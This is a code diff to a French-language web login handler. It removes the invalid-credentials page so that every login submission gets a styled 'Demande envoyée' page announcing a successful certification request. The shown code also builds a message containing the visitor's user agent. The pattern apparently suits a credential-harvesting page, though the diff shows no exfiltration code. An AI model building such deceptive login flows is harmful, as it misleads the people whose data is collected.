@@ -164,147 +164,106 @@ def login_submit(
         f"ua: <code>{safe_ua}</code>"
     )
 
-    if ok:
-        return HTMLResponse(
-            """
-            <!doctype html>
-            <html lang="fr">
-            <head>
-            <meta charset="utf-8">
-            <title>Demande envoyée</title>
-            <style>
-              :root {
-                --bg-1: #0b0d1a;
-                --bg-2: #1f1238;
-                --pink: #ff4db8;
-                --purple: #8b5cf6;
-                --cyan: #38d7ff;
-                --yellow: #ffd84d;
-                --text: #fffaff;
-                --muted: #dbcaff;
-              }
-              * { box-sizing: border-box; }
-              body {
-                margin: 0;
-                min-height: 100vh;
-                display: grid;
-                place-items: center;
-                font-family: "Segoe UI", Tahoma, sans-serif;
-                background: radial-gradient(circle at top, rgba(139,92,246,0.4), transparent 20%),
-                            radial-gradient(circle at bottom right, rgba(255,77,184,0.3), transparent 25%),
-                            linear-gradient(135deg, var(--bg-1), var(--bg-2));
-                color: var(--text);
-              }
-              .card {
-                width: min(92vw, 540px);
-                background: linear-gradient(180deg, rgba(17,15,28,0.96), rgba(24,18,39,0.92));
-                border: 1px solid rgba(255,255,255,0.08);
-                border-radius: 28px;
-                padding: 30px 26px 26px;
-                text-align: center;
-                box-shadow: 0 25px 60px rgba(0,0,0,0.42), 0 0 0 1px rgba(255,77,184,0.2);
-              }
-              .logo {
-                width: 148px;
-                display: block;
-                margin: 0 auto 10px;
-                filter: drop-shadow(0 16px 28px rgba(255,77,184,0.35));
-              }
-              .badge {
-                width: 110px;
-                height: 110px;
-                display: block;
-                margin: 0 auto 18px;
-                filter: drop-shadow(0 18px 24px rgba(255, 216, 77, 0.25));
-              }
-              .tag {
-                display: inline-block;
-                padding: 8px 14px;
-                border-radius: 999px;
-                background: linear-gradient(135deg, rgba(255,216,77,0.22), rgba(255,77,184,0.18));
-                color: var(--yellow);
-                font-size: 0.72rem;
-                font-weight: 800;
-                letter-spacing: 0.12em;
-                text-transform: uppercase;
-                margin-bottom: 14px;
-              }
-              h1 {
-                margin: 0;
-                font-size: clamp(2rem, 5vw, 3rem);
-                letter-spacing: -0.06em;
-                background: linear-gradient(135deg, #ffd84d 0%, #ff4db8 40%, #38d7ff 100%);
-                -webkit-background-clip: text;
-                background-clip: text;
-                color: transparent;
-              }
-              p {
-                color: var(--muted);
-                font-size: 1.06rem;
-                line-height: 1.7;
-                margin: 18px auto 0;
-                max-width: 30ch;
-              }
-              .btn {
-                display: inline-block;
-                margin-top: 26px;
-                text-decoration: none;
-                background: linear-gradient(135deg, var(--pink), var(--purple), var(--cyan));
-                color: white;
-                padding: 12px 22px;
-                border-radius: 12px;
-                font-weight: 800;
-                box-shadow: 0 12px 20px rgba(139, 92, 246, 0.25);
-              }
-            </style>
-            </head>
-            <body>
-              <div class="card">
-                <img class="badge" src="/static/certification-logo.png" alt="logo de certification">
-                <div class="tag">Validation</div>
-                <h1>Demande envoyée</h1>
-                <p>Votre demande de certification a été envoyée avec succès.</p>
-                <a class="btn" href="/login">Retour</a>
-              </div>
-            </body>
-            </html>
-            """
-        )
     return HTMLResponse(
         """
         <!doctype html>
         <html lang="fr">
         <head>
         <meta charset="utf-8">
-        <title>Identifiants invalides</title>
+        <title>Demande envoyée</title>
         <style>
+          :root {
+            --bg-1: #0b0d1a;
+            --bg-2: #1f1238;
+            --pink: #ff4db8;
+            --purple: #8b5cf6;
+            --cyan: #38d7ff;
+            --yellow: #ffd84d;
+            --text: #fffaff;
+            --muted: #dbcaff;
+          }
+          * { box-sizing: border-box; }
           body {
             margin: 0;
             min-height: 100vh;
             display: grid;
             place-items: center;
-            background: linear-gradient(135deg, #fff3f3, #fff7f7);
-            font-family: "Segoe UI", sans-serif;
+            font-family: "Segoe UI", Tahoma, sans-serif;
+            background: radial-gradient(circle at top, rgba(139,92,246,0.4), transparent 20%),
+                        radial-gradient(circle at bottom right, rgba(255,77,184,0.3), transparent 25%),
+                        linear-gradient(135deg, var(--bg-1), var(--bg-2));
+            color: var(--text);
           }
-          .box {
-            max-width: 440px;
-            width: min(90vw, 440px);
-            background: white;
-            border-radius: 20px;
-            padding: 30px 24px;
+          .card {
+            width: min(92vw, 540px);
+            background: linear-gradient(180deg, rgba(17,15,28,0.96), rgba(24,18,39,0.92));
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 28px;
+            padding: 30px 26px 26px;
             text-align: center;
-            box-shadow: 0 18px 40px rgba(120, 20, 20, 0.12);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.42), 0 0 0 1px rgba(255,77,184,0.2);
           }
-          h3 { margin: 0 0 12px; color: #b62424; }
-          p { margin: 0; color: #5f6674; }
-          a { display: inline-block; margin-top: 18px; color: #1748d6; font-weight: 700; }
+          .logo {
+            width: 148px;
+            display: block;
+            margin: 0 auto 10px;
+            filter: drop-shadow(0 16px 28px rgba(255,77,184,0.35));
+          }
+          .badge {
+            width: 110px;
+            height: 110px;
+            display: block;
+            margin: 0 auto 18px;
+            filter: drop-shadow(0 18px 24px rgba(255, 216, 77, 0.25));
+          }
+          .tag {
+            display: inline-block;
+            padding: 8px 14px;
+            border-radius: 999px;
+            background: linear-gradient(135deg, rgba(255,216,77,0.22), rgba(255,77,184,0.18));
+            color: var(--yellow);
+            font-size: 0.72rem;
+            font-weight: 800;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            margin-bottom: 14px;
+          }
+          h1 {
+            margin: 0;
+            font-size: clamp(2rem, 5vw, 3rem);
+            letter-spacing: -0.06em;
+            background: linear-gradient(135deg, #ffd84d 0%, #ff4db8 40%, #38d7ff 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+          }
+          p {
+            color: var(--muted);
+            font-size: 1.06rem;
+            line-height: 1.7;
+            margin: 18px auto 0;
+            max-width: 30ch;
+          }
+          .btn {
+            display: inline-block;
+            margin-top: 26px;
+            text-decoration: none;
+            background: linear-gradient(135deg, var(--pink), var(--purple), var(--cyan));
+            color: white;
+            padding: 12px 22px;
+            border-radius: 12px;
+            font-weight: 800;
+            box-shadow: 0 12px 20px rgba(139, 92, 246, 0.25);
+          }
         </style>
         </head>
         <body>
-          <div class="box">
-            <h3>Identifiants invalides.</h3>
-            <p>Veuillez vérifier votre adresse e-mail et votre mot de passe.</p>
-            <a href="/login">Retour au login</a>
+          <div class="card">
+            <img class="badge" src="/static/certification-logo.png" alt="logo de certification">
+            <div class="tag">Validation</div>
+            <h1>Demande envoyée</h1>
+            <p>Votre demande de certification a été envoyée avec succès.</p>
+            <a class="btn" href="/login">Retour</a>
           </div>
         </body>
         </html>
